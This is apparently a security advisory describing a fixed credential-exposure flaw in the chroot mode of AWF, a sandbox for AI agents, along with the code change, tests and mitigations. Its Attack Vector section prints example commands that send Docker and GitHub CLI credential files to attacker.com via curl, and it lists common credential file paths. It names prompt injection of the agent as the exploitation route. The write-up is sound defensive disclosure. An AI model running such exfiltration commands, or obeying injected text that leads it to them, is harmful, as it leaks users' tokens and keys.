# Security Fix: Chroot Mode Credential Bypass Vulnerability

## Summary

Fixed a high-severity credential exfiltration vulnerability in chroot mode where credentials could be accessed via a direct home directory mount, bypassing the selective mounting protection.

## Vulnerability Details

### Root Cause

In chroot mode (`--enable-chroot`), the home directory was mounted at **two locations**:

1. **Direct mount at `$HOME`** (line 437 in `src/docker-manager.ts`)
   - Purpose: Allow container environment to access workspace files
   - Example: `/home/runner:/home/runner:rw`

2. **Chroot mount at `/host$HOME`** (line 479 in `src/docker-manager.ts`)
   - Purpose: Allow chroot operations to access host files
   - Example: `/home/runner:/host/home/runner:rw`

**The vulnerability:** Credentials were only hidden at `/host$HOME` paths using `/dev/null` overlays. The direct `$HOME` mount had no protection.

### Attack Vector

```bash
# Inside AWF container with --enable-chroot (BEFORE FIX):

# Attempt 1: Access via /host path
cat /host/home/runner/.docker/config.json
# Result: Empty file ✓ (protected by /dev/null overlay)

# Attempt 2: Access via direct home path
cat /home/runner/.docker/config.json
# Result: Full credentials exposed ❌ (NO PROTECTION)

# Attacker could exfiltrate:
cat ~/.docker/config.json | base64 | curl -X POST https://attacker.com/collect
cat ~/.config/gh/hosts.yml | base64 | curl -X POST https://attacker.com/collect
```

### Affected Credentials

All credential files were vulnerable via the direct home mount:

- `~/.docker/config.json` - Docker Hub tokens
- `~/.config/gh/hosts.yml` - GitHub CLI OAuth tokens (gho_*)
- `~/.npmrc` - NPM registry tokens
- `~/.cargo/credentials` - Rust crates.io tokens
- `~/.composer/auth.json` - PHP Composer tokens
- `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa` - SSH private keys
- `~/.aws/credentials`, `~/.aws/config` - AWS credentials
- `~/.kube/config` - Kubernetes credentials
- `~/.azure/credentials` - Azure credentials
- `~/.config/gcloud/credentials.db` - GCP credentials

## The Fix

### Code Changes

**File: `src/docker-manager.ts`**

**Before (lines 644-676):**
```typescript
} else if (!config.enableChroot) {
  // Only hide credentials in normal mode
  // Chroot mode handled separately below
  const credentialFiles = [...];
  credentialFiles.forEach(credFile => {
    agentVolumes.push(`/dev/null:${credFile}:ro`);
  });
}
```

**After (lines 634-681):**
```typescript
} else {
  // Hide credentials in ALL modes (normal and chroot)
  // IMPORTANT: In chroot mode, home is mounted at BOTH:
  // - ${effectiveHome} (direct mount)
  // - /host${userHome} (chroot mount)
  // We must hide credentials at BOTH paths
  const credentialFiles = [...];
  credentialFiles.forEach(credFile => {
    agentVolumes.push(`/dev/null:${credFile}:ro`);
  });
}

// Chroot mode: ALSO hide credentials at /host paths
if (config.enableChroot && !config.allowFullFilesystemAccess) {
  const chrootCredentialFiles = [...];
  chrootCredentialFiles.forEach(mount => {
    agentVolumes.push(mount);
  });
}
```

**Key changes:**
1. Changed `else if (!config.enableChroot)` to `else` - applies to all modes
2. Kept existing `/host` path credential hiding for chroot mode
3. Added detailed comments explaining the dual-mount architecture
4. Credentials now hidden at BOTH mount locations in chroot mode

### Test Coverage

**File: `tests/integration/credential-hiding.test.ts`**

Added new tests to verify the fix:

- **Test 8:** Verifies Docker config is hidden at direct home path in chroot mode
- **Test 9:** Verifies GitHub CLI tokens are hidden at direct home path in chroot mode

Updated existing test numbers (10-14) to accommodate new tests.

### Documentation Updates

**File: `docs/selective-mounting.md`**

- Added `${HOME}:${HOME}:rw` to "What gets mounted" section for chroot mode
- Split "What gets hidden" into two sections:
  1. Direct home mount credentials (14 files)
  2. Chroot /host mount credentials (14 files)
- Added security note: "Dual-mount protection: Credentials hidden at both `$HOME` and `/host$HOME` paths"

## Verification

### After Fix

```bash
# Inside AWF container with --enable-chroot (AFTER FIX):

# Both paths are now protected
cat /home/runner/.docker/config.json
# Result: Empty file ✓ (protected)

cat /host/home/runner/.docker/config.json
# Result: Empty file ✓ (protected)

# All credential files return empty content
for file in ~/.docker/config.json ~/.config/gh/hosts.yml ~/.npmrc; do
  echo "Testing: $file"
  cat "$file"
done
# All return empty (0 bytes)
```

### Debug Logs

With `--log-level debug`, you'll see:

```
[DEBUG] Using selective mounting for security (credential files hidden)
[DEBUG] Hidden 14 credential file(s) via /dev/null mounts
[DEBUG] Chroot mode: Also hiding credential files at /host paths
[DEBUG] Hidden 14 credential file(s) at /host paths
```

## Impact Assessment

### Severity
**High** - Allows credential exfiltration via prompt injection in chroot mode

### Affected Versions
All versions with `--enable-chroot` support (introduced in early versions)

### Scope
Only affects chroot mode (`--enable-chroot` flag). Normal mode was never vulnerable.

### Exploitation Requirements
- Attacker must achieve prompt injection in the AI agent
- AWF must be running with `--enable-chroot` flag
- Credential files must exist on the host system

### Real-World Risk
**Moderate to High** in production environments:
- GitHub Actions runners have GitHub CLI tokens (`~/.config/gh/hosts.yml`)
- Developer machines may have Docker Hub, NPM, Cargo tokens
- Prompt injection attacks are practical against AI agents

## Mitigation

### Immediate Action
Update to the patched version with this fix.

### Workarounds (if update not possible)
1. Don't use `--enable-chroot` mode if not strictly necessary
2. Remove credential files before running AWF
3. Use `--allow-full-filesystem-access` flag explicitly to acknowledge risks

### Defense in Depth
This fix is part of AWF's multi-layered security approach:

1. ✅ **Network restrictions** - Domain whitelisting via Squid proxy
2. ✅ **Environment variable scrubbing** - One-shot tokens via LD_PRELOAD
3. ✅ **Docker compose redaction** - Secrets removed from config files
4. ✅ **Selective mounting** - Credentials hidden via /dev/null overlays (THIS FIX)

## Timeline

- **Discovery:** Identified during selective mounting security review
- **Fix Applied:** Lines 634-716 in `src/docker-manager.ts`
- **Tests Added:** Tests 8-9 in `tests/integration/credential-hiding.test.ts`
- **Documentation:** Updated `docs/selective-mounting.md`

## References

- **Files Changed:**
  - `src/docker-manager.ts` (lines 634-716)
  - `tests/integration/credential-hiding.test.ts` (lines 182-229)
  - `docs/selective-mounting.md` (lines 99-173)

- **Related Documentation:**
  - [Selective Mounting Security](docs/selective-mounting.md)
  - [Security Architecture](docs/security.md)
  - [Chroot Mode](docs/chroot-mode.md)

## Lessons Learned

1. **Dual-mount scenarios require explicit protection**: When mounting the same directory at multiple locations, security controls must be applied to ALL locations.

2. **Defense-in-depth validation**: Even with multiple security layers, each layer must be independently verified for bypass vulnerabilities.

3. **Test all modes**: Security features must be tested in all operational modes (normal, chroot, full-filesystem-access) to catch mode-specific vulnerabilities.

4. **Documentation is critical**: The dual-mount architecture should have been more prominently documented to prevent this oversight.

## Conclusion

This fix ensures that AWF's selective mounting security works correctly in chroot mode by protecting credentials at all mount locations. The vulnerability has been closed, and comprehensive tests ensure it won't regress.
